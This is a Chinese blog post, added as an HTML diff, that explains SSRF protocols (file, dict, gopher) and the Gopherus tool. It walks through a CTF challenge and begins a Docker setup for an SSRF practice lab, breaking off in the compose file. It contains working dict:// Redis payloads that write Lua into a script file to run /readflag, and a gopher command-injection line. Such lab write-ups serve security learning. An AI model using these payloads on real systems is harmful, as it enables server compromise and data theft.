@@ -1,0 +1,1013 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/tuyi.jpg">
+  <link rel="icon" href="/img/tuyi.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="tuyi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言前些天有个师傅问我软件安全赛那个ssrf打redis的题目，发现自己对于ssrf这一块并不是很懂，没有自己的一个思路，借以此篇来剖析ssrf SSRFSSRF是一种由攻击者构造形成由服务端发起请求的一个安全漏洞，一般情况下，SSRF攻击的目标是从外网无法访问的内部系统，就是因为他是服务端发起的所有可以直接访问内网资源，ssrf的利用大多是协议的利用 常见协议filefile:&#x2F;&#x2F; 是一种URI">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF深入剖析+国光SSRF靶场攻克">
+<meta property="og:url" content="https://tuyiisxp.github.io/2025/04/07/SSRF%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90-%E5%9B%BD%E5%85%89SSRF%E9%9D%B6%E5%9C%BA%E6%94%BB%E5%85%8B/">
+<meta property="og:site_name" content="tuyi的小站">
+<meta property="og:description" content="前言前些天有个师傅问我软件安全赛那个ssrf打redis的题目，发现自己对于ssrf这一块并不是很懂，没有自己的一个思路，借以此篇来剖析ssrf SSRFSSRF是一种由攻击者构造形成由服务端发起请求的一个安全漏洞，一般情况下，SSRF攻击的目标是从外网无法访问的内部系统，就是因为他是服务端发起的所有可以直接访问内网资源，ssrf的利用大多是协议的利用 常见协议filefile:&#x2F;&#x2F; 是一种URI">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250407170723291.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250407175146983.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250407181707687.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408152900729.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408152948780.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408153340067.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408153944930.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/16205694239190.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408161712436.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408161811463.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408162647474.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408173918386.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408175815246.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408180118005.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408221700376.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408221908874.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408222002410.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408224712188.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408224839796.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408225016798.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408225308832.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408225323772.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408231953379.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408232051621.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409110428160.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409110450918.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409111321133.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409112148831.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409111432179.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409112307716.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409122659944.png">
+<meta property="article:published_time" content="2025-04-07T08:21:27.000Z">
+<meta property="article:modified_time" content="2025-04-09T04:31:09.909Z">
+<meta property="article:author" content="tuyi">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="ssrf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250407170723291.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>SSRF深入剖析+国光SSRF靶场攻克 - tuyi的小站</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/reward.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tuyiisxp.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>tuyi的小站</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SSRF深入剖析+国光SSRF靶场攻克"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-07 16:21" pubdate>
+          2025年4月7日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          23 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SSRF深入剖析+国光SSRF靶场攻克</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年4月9日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前些天有个师傅问我软件安全赛那个ssrf打redis的题目，发现自己对于ssrf这一块并不是很懂，没有自己的一个思路，借以此篇来剖析ssrf</p>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF是一种由攻击者构造形成由服务端发起请求的一个安全漏洞，一般情况下，SSRF攻击的目标是从外网无法访问的内部系统，就是因为他是服务端发起的所有可以直接访问内网资源，<strong>ssrf的利用大多是协议的利用</strong></p>
+<h2 id="常见协议"><a href="#常见协议" class="headerlink" title="常见协议"></a>常见协议</h2><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p><code>file://</code> 是一种<code>URI</code>协议，用于访问本地文件系统中的文件。它允许应用程序或浏览器直接从本地存储中读取文件，而无需通过网络请求</p>
+<p>若我们可以控制服务端，那我们就可以利用他访问到内网机器文件</p>
+<p>基本格式：<code>file://[主机名]/路径</code></p>
+<ul>
+<li><p><strong>主机名</strong>：通常为空，或者 <code>localhost</code>，表示访问本机文件。如果是远程系统，可以指定主机名（但多数情况下不支持）</p>
+</li>
+<li><p><strong>路径</strong>：指定本地文件的完整路径，注意区分Windows 和 Unix 系统</p>
+</li>
+<li><p>Windows 需要 <strong>三个斜杠</strong>（<code>///</code>），因为 <code>C:</code> 盘符本身包含 <code>:</code>，而 Unix 只需要两个斜杠（<code>//</code>）</p>
+</li>
+</ul>
+<h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>可以用来探测内网服务，端口开启情况，以及命令执行，但是命令执行的时候必须是未设置密码的情况</p>
+<p><strong>使用方式：</strong></p>
+<ul>
+<li><p><code>dict://serverip:port/</code>命令:参数</p>
+</li>
+<li><p>向服务器的端口请求为【命令:参数】，并在末尾自动补上\r\n(咳咳<code>csrf</code>?)</p>
+</li>
+<li><p>dict协议执行命令要一条一条执行</p>
+</li>
+</ul>
+<p>主要就是探测服务和端口情况，执行命令的或很是鸡肋，基本就只有redis的未授权了</p>
+<p>但是还是可以探测服务版本，就想我本地开个mysql有密码</p>
+<p>使用dict去连接</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250407170723291.png" srcset="/img/loading.gif" lazyload alt="image-20250407170723291"></p>
+<p>可以看出是mysql数据库(手动滑稽)，还可以打打redis的未授权</p>
+<h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><p>gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell，在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用TCP70端口</p>
+<p>使用格式为</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;server&gt;<span class="hljs-symbol">:&lt;port&gt;/&lt;prefix&gt;&lt;encoded_data&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>&lt;prefix&gt;</code></strong> 可以是单字符（如 <code>_</code>、<code>1</code> 等），但部分服务会根据前缀字符触发不同行为（如 Redis 会解析前缀为命令长度）。所以常用的还是<code>_</code></li>
+<li>数据部分的特殊字符（如 <code>?</code>、<code>&amp;</code>、空格等）必须 URL 编码，否则会被截断或解析错误。</li>
+</ul>
+<p>这个协议最好玩的就是如果getshell的情况下，可以直接RCE，不用编码不用做格式转换，并且端口只需要存活即可，不用特殊端口，但是实用性感觉不大</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl gopher://localhost:80/_`<span class="hljs-built_in">cat</span> /home/1.txt &gt; 2.txt`<br></code></pre></td></tr></table></figure>
+
+<p>命令是服务端执行</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250407175146983.png" srcset="/img/loading.gif" lazyload alt="image-20250407175146983"></p>
+<p>这个协议能够完美的解决<code>dict</code>协议只能执行一条命令导致无法攻击授权应用的短板</p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="gopherus"><a href="#gopherus" class="headerlink" title="gopherus"></a>gopherus</h3><p>gopher协议的强大工具 <a target="_blank" rel="noopener" href="https://github.com/Esonhugh/Gopherus3">地址</a></p>
+<p>安装：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">pip install --use-pep517 git+https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Esonhugh/</span>Gopherus3.git <span class="hljs-comment">#针对python3最新修正</span><br></code></pre></td></tr></table></figure>
+
+<p>工具的基本针对的都是未授权服务，对于sql这种手写比较麻烦的确实工具不错</p>
+<p>使用</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>gopherus3 –帮助</td>
+<td>帮助</td>
+</tr>
+<tr>
+<td>gopherus3 –漏洞利用</td>
+<td>参数可以是 ：</td>
+</tr>
+<tr>
+<td></td>
+<td>–利用 mysql -h</td>
+</tr>
+<tr>
+<td></td>
+<td>–利用 postgresql -h</td>
+</tr>
+<tr>
+<td></td>
+<td>–exploit fastcgi -h</td>
+</tr>
+<tr>
+<td></td>
+<td>–exploit redis -h</td>
+</tr>
+<tr>
+<td></td>
+<td>–exploit zabbix -h</td>
+</tr>
+<tr>
+<td></td>
+<td>–利用 pymemcache -h</td>
+</tr>
+<tr>
+<td></td>
+<td>–利用 rbmemcache -h</td>
+</tr>
+<tr>
+<td></td>
+<td>–利用 phpmemcache -h</td>
+</tr>
+<tr>
+<td></td>
+<td>–dmpmemcache -h 漏洞利用</td>
+</tr>
+<tr>
+<td></td>
+<td>–利用 smtp -h</td>
+</tr>
+</tbody></table>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250407181707687.png" srcset="/img/loading.gif" lazyload alt="image-20250407181707687"></p>
+<p>在对payload进行二次编码就行</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>CachedVisitor</p>
+<p>搭建环境</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> build -t cachedvisitor:v1 .<br><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">32777</span>:<span class="hljs-number">80</span> cachedvisitor:v1<br></code></pre></td></tr></table></figure>
+
+<p> <img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408152900729.png" srcset="/img/loading.gif" lazyload alt="image-20250408152900729"></p>
+<p>可以通外网</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408152948780.png" srcset="/img/loading.gif" lazyload alt="image-20250408152948780"></p>
+<p>存在ssrf同时看到有个redis</p>
+<p>看看dict是否可用</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408153340067.png" srcset="/img/loading.gif" lazyload alt="image-20250408153340067"></p>
+<p>dict可用，而且redis可用执行命令</p>
+<p>分析一下源码</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read_file</span><span class="hljs-params">(filename)</span></span><br>    <span class="hljs-keyword">local</span> file = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;r&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: Could not open file &quot;</span> .. filename)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-keyword">local</span> content = file:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*a&quot;</span>)<br>    file:<span class="hljs-built_in">close</span>()<br>    <span class="hljs-keyword">return</span> content<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute_lua_code</span><span class="hljs-params">(script_content)</span></span><br>    <span class="hljs-keyword">local</span> lua_code = script_content:<span class="hljs-built_in">match</span>(<span class="hljs-string">&quot;##LUA_START##(.-)##LUA_END##&quot;</span>)<br>    <span class="hljs-keyword">if</span> lua_code <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">local</span> chunk, err = <span class="hljs-built_in">load</span>(lua_code)<br>        <span class="hljs-keyword">if</span> chunk <span class="hljs-keyword">then</span><br>            <span class="hljs-keyword">local</span> success, result = <span class="hljs-built_in">pcall</span>(chunk)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> success <span class="hljs-keyword">then</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error executing Lua code: &quot;</span>, result)<br>            <span class="hljs-keyword">end</span><br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error loading Lua code: &quot;</span>, err)<br>        <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: No valid Lua code block found.&quot;</span>)<br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br>    <span class="hljs-keyword">local</span> filename = <span class="hljs-string">&quot;/scripts/visit.script&quot;</span><br>    <span class="hljs-keyword">local</span> script_content = read_file(filename)<br>    <span class="hljs-keyword">if</span> script_content <span class="hljs-keyword">then</span><br>        execute_lua_code(script_content)<br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br>main()<br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">COPY</span><span class="language-bash"> flag /flag</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> readflag /readflag</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> 400 /flag</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +xs /readflag</span><br><br></code></pre></td></tr></table></figure>
+
+<p>lua脚本会执行我们写在<code>/scripts/visit.script</code>的脚本，我们的目的是执行<code>readfile</code></p>
+<p>我们用<code>redis</code>将<code> lua</code> 写入<code> visit.script</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">dict://127.0.0.1:6379/set:payload:<span class="hljs-string">&quot;##LUA_START##ngx.say(io.popen(&#x27;/readflag&#x27;):read(&#x27;*all&#x27;))##LUA_END##&quot;</span>  <span class="hljs-comment">#设置键payload为我们的命令 </span><br>dict://127.0.0.1:6379/config:<span class="hljs-built_in">set</span>:<span class="hljs-built_in">dir</span>:/scripts/  <span class="hljs-comment">#更改 Redis 配置，使其dir指向/scripts/目录</span><br>dict://127.0.0.1:6379/config:<span class="hljs-built_in">set</span>:dbfilename:visit.script  <span class="hljs-comment">#更改数据库文件名</span><br>dict://127.0.0.1:6379/bgsave <span class="hljs-comment">#保存</span><br></code></pre></td></tr></table></figure>
+
+<p>在刷新一下执行脚本</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408153944930.png" srcset="/img/loading.gif" lazyload alt="image-20250408153944930"></p>
+<p>拿到flag</p>
+<h1 id="国光SSRF靶场"><a href="#国光SSRF靶场" class="headerlink" title="国光SSRF靶场"></a>国光SSRF靶场</h1><p>地址：<a target="_blank" rel="noopener" href="https://github.com/Duoduo-chino/ssrf_vul">https://github.com/Duoduo-chino/ssrf_vul</a></p>
+<p>GitHub上找到的现成的镜像</p>
+<p>靶场拓扑图(网段有变化);<code>·29.28没有</code></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/16205694239190.png" srcset="/img/loading.gif" lazyload alt="16205694239190"></p>
+<p>修改一下<code>docker-compose.yml</code></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;2&#x27;</span><br><br><span class="hljs-attr">networks:</span><br>  <span class="hljs-attr">ssrf_v:</span><br>    <span class="hljs-attr">ipam:</span><br>      <span class="hljs-attr">config:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">subnet:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">/16</span><br>          <span class="hljs-attr">gateway:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><br><span class="hljs-attr">services:</span> <br>  <span class="hljs-attr">ssrfweb1:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v1</span><br>    <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">32780</span><span class="hljs-string">:80</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span> <br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.21</span><br> <br>  <span class="hljs-attr">ssrfweb2:</span> <br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v2</span><br>    <span class="hljs-attr">networks:</span> <br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.22</span><br><br>  <span class="hljs-attr">ssrfweb3:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v3</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.23</span><br><br>  <span class="hljs-attr">ssrfweb4:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v4</span><br>    <span 